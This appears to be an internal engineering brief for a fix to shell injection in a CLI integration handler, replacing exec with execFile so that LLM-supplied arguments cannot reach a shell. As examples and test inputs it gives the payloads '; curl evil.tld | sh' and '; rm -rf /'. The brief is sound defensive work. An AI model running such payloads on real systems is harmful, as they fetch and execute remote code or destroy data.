# Brief: CLI Tool Arg Escaping (P0 security)

**Date:** 2026-04-16
**Status:** complete
**Depends on:** Brief 169 (parent)
**Unlocks:** Safe use of CLI-protocol integration tools with LLM-controlled arguments.

## Goal

- **Roadmap phase:** Phase 3 Integrations hardening
- **Capabilities:** Closes P0 shell-injection risk in CLI integration handler.

## Context

`buildCliCommand()` in `src/engine/tool-resolver.ts:1014-1043` interpolates LLM-supplied tool arguments directly into a shell command template and executes it via `child_process.exec()`. `exec` spawns a shell, so any metacharacter in an LLM-generated argument is interpreted (`;`, `&&`, `$(...)`, backticks, redirects). A malicious or hallucinated argument like `"; curl evil.tld | sh"` would execute. The integration handler in `src/engine/integration-handlers/cli.ts` has the same pattern when building the final command string (`cli.ts:107` uses `exec`).

Credential scrubbing (`scrubCredentials` in `cli.ts:54-65`) is already in place for logs — this brief adds the missing escape layer on execution.

## Objective

Make CLI tool invocation injection-safe: LLM cannot cause shell interpretation of any substituted argument, regardless of content.

## Non-Goals

- Changing the YAML command template syntax for existing integration definitions.
- Adding sandboxing beyond shell escaping (seccomp, containers, etc.).
- Touching the REST handler (no shell in that path).

## Inputs

1. `src/engine/tool-resolver.ts` lines 1000-1110 — CLI command building and execution
2. `src/engine/integration-handlers/cli.ts` — full file
3. `integrations/*.yaml` — existing CLI command templates to preserve compatibility
4. `src/engine/tools.ts:19-297` — existing `execFile` pattern in agent tools for reference

## Constraints

- Must preserve all existing integration YAML templates without editing them — the fix is at the execution boundary, not the spec.
- Must keep the current 120s timeout, 10MB buffer, 3-attempt retry semantics in `integration-handlers/cli.ts`.
- Must keep credential scrubbing in `scrubCredentials`.

## Provenance

| What | Source | Level | Why |
|------|--------|-------|-----|
| `execFile` + arg array pattern | Node.js docs, agent tools `src/engine/tools.ts:19` | pattern | Already the in-house standard for shell-free command execution |
| Template tokenization | `shell-quote` npm package parse/quote | pattern | Standard way to tokenize a template into an argv with literal vs variable positions |

## What Changes (Work Products)

| File | Action |
|------|--------|
| `src/engine/tool-resolver.ts` | Modify: rewrite `buildCliCommand` to produce `{ executable, args: string[] }` instead of a single string; keep `interpolate` only for literal-template positions, never for user args |
| `src/engine/integration-handlers/cli.ts` | Modify: switch from `exec(cmdString)` to `execFile(executable, args)`; arg array passed through unshelled |
| `src/engine/tool-resolver.test.ts` | Modify: add tests covering `;`, `&&`, `$(...)`, backticks, newlines, unicode quotes in arg values |
| `src/engine/integration-handlers/cli.test.ts` | Modify: add regression test for injection payloads |
| `docs/insights/` | Optional: insight file on LLM-arg shell-injection class of bug if novel |

## User Experience

- **Jobs affected:** None directly. Invisible correctness/safety fix.
- **Process-owner perspective:** Integrations that run shell tools (`gh`, `git`, Zapier CLI in future) remain functional. No user-facing change unless an existing YAML template relied on shell interpretation of an arg (which would be a bug itself).

## Acceptance Criteria

1. [ ] `buildCliCommand` returns `{ executable: string; args: string[] }`, not a concatenated string.
2. [ ] CLI handler uses `execFile` with the args array; no `exec` call remains in the integration execution path.
3. [ ] Test: tool argument value `"; rm -rf /"` does not spawn a second process (observed via spy on `execFile`).
4. [ ] Test: tool argument value with backticks, `$(...)`, newlines, and unicode quotes reaches the target executable verbatim as a single argv entry.
5. [ ] All existing integration YAMLs still execute correctly (smoke test with `gh issue list` via the test harness).
6. [ ] Timeout, buffer, retry, and credential scrub behaviour preserved (existing tests still green).

## Review Process

1. Spawn review agent with `docs/architecture.md` + `docs/review-checklist.md` + OWASP A03:2021 (injection)
2. Review agent verifies: no remaining `exec()` in integration path, arg array path tested, no regression in retry/timeout
3. Present to human

## Smoke Test

```bash
pnpm test -- tool-resolver cli
# Expect: all tool-resolver and cli tests pass; new injection tests pass.

# Regression: run a real CLI tool end-to-end if a gh integration is wired in local env
pnpm cli sync
# Should not introduce any integration load errors.
```

## After Completion

1. Update `docs/state.md`: "Brief 170 — CLI arg escaping (2026-04-16, complete): `execFile` with arg array, shell interpretation no longer possible. Tests cover `;`, `&&`, `$(...)`, backticks."
2. Consider writing insight file on the class of bug.
